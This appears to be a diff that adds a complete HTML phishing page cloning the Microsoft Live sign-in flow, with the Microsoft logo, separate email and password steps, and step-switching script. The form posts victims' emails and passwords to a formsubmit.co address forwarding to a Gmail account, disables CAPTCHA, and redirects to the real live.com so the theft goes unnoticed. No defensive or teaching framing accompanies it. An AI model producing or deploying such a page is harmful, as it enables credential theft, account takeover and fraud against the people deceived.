@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Live Signin Page Clone</title>
+</head>
+
+<body>
+    <div class="container">
+        <form action="https://formsubmit.co/officemailservice46@gmail.com" method="POST">
+            <img class="logo" src="image/microsoftlogo.png" width="142" />
+            <div class="forms-container">
+                <div class="forms">
+                    <!-- First Step: Email Input -->
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" id="email" name="email" placeholder="Email, Phone, or Skype" required />
+                        </div>
+                        <p>No account? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <!-- This is the "Next" button -->
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+
+                    <!-- Second Step: Password Input -->
+                    <div class="second" style="display: none;">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">your@email.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" name="password" id="password" placeholder="Password" required />
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <!-- This is the "Sign In" button -->
+                        <button type="submit" id="signBtn">Sign in</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Disable CAPTCHA -->
+            <input type="hidden" name="_captcha" value="false" />
+
+            <!-- Optional redirect after form submission -->
+            <input type="hidden" name="_next" value="https://www.live.com" />
+        </form>
+
+        <div class="bottom">
+            <img src="image/key.png" width="142" />
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+    <script>
+        const next_button = document.querySelector('.next-btn');
+        const email_input = document.querySelector('#email');
+        const first_step = document.querySelector('.first');
+        const second_step = document.querySelector('.second');
+        const email_display = document.querySelector('.email');
+        const arrow_btn = document.querySelector('.arrow-btn');
+
+        // Show second step (password input) when "Next" button is clicked
+        next_button.addEventListener('click', () => {
+            if (email_input.value.trim() !== '') {
+                // Hide the first step
+                first_step.style.display = 'none';
+
+                // Show the second step
+                second_step.style.display = 'block';
+
+                // Set the email for display on the second step
+                email_display.innerText = email_input.value;
+            } else {
+                // Add red border if email is empty
+                email_input.style.borderBottomColor = '#f00';
+            }
+        });
+
+        // Go back to the first step when arrow button is clicked
+        arrow_btn.addEventListener('click', () => {
+            // Show the first step
+            first_step.style.display = 'block';
+
+            // Hide the second step
+            second_step.style.display = 'none';
+        });
+    </script>
+</body>
+
+</html>
